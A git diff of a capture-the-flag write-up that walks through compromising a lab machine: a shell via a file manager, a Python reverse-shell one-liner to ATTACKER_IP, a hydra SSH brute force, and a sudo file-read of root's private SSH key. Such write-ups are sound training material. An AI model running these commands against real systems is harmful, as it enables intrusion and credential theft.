@@ -94,7 +94,7 @@ Now it doesn't work. I re-check the url, and see that I need to append /elFinder
 
 <img width="572" height="143" alt="Initial_access_lookup" src="https://github.com/user-attachments/assets/a5f9eb7b-81b9-40ed-bc0f-449aa1050326" />
 
-### Privilege Escalation
+### Lateral Movement 
 
 Since we have an unstable shell, we'll try to get more stable one. We try to use the python3 one-liner:
 ```python
@@ -106,7 +106,7 @@ Let's try a reverse shell. We set up a listener on our attacker using the comman
 ```python
 python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKER_IP",PORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"])'
 ```
-We now have a better shell and can cintunie with our goal of privilege escalation.
+We now have a better shell to work with.
 
 
 When we run sudo -l, listing all the command we are allowed to execute as root without a password, we hit a password prompt. Since we don't know the password, we leave that for now.
@@ -157,5 +157,34 @@ chmod +x id # don't forget to make it executable!
 
 running `./id` now returns the exact same output as if the user "think" had run id.
 
-Now run /usr/sbin/pwm again:
+Lets try running /usr/sbin/pwm again:
 
+<img width="1261" height="140" alt="image" src="https://github.com/user-attachments/assets/775f7f9c-4e4e-4a10-9ebf-6b63cde67313" />
+
+Moom! We now have a list of possible password for the user think. Save them to a file on the attacker machine and brute-force the ssh password:
+``` bash
+hydra -l think -P jose_passwords machine ssh -vV
+```
+We get a password and can login as "think" and get the user flag.
+
+### Privilege Escalation
+
+First of all, let's check `sudo -l`:
+
+<img width="642" height="154" alt="image" src="https://github.com/user-attachments/assets/630bde15-d4b2-445f-a0c6-d50b6c33d4e5" />
+
+we can see that think can execute the look command as sudo without needing a password. Let's check https://gtfobins.github.io/ if we can exploit this in any way...
+
+<img width="917" height="200" alt="image" src="https://github.com/user-attachments/assets/47be7070-8a75-4ee7-bdd0-edb267b7b3fb" />
+
+Bingo! It lets us read any file we want. First I extracted the root hash and started cracking it using john root_hash.txt.
+
+While this was amounting to nothing, I tried to think about other ways to exploit this, as cracking the root hash is rarely the answer unless specified. I could of course print the root flag, but I wanted root access...
+
+The answer is ssh! I enteres ` sudo less '' /root/.ssh/id_rsa`, and got the private key! Save that to your attacker machine and you can login as root and obtain the flag. 
+
+<img width="654" height="442" alt="image" src="https://github.com/user-attachments/assets/b6b96018-e6b1-4c48-b74c-801f4f53d692" />
+
+This was an interesting machine featuring login bypass, exploiting a vulnerable application, lateral movement and privilege escalation using look.
+
+I hope you enjoyed! See you next time :)
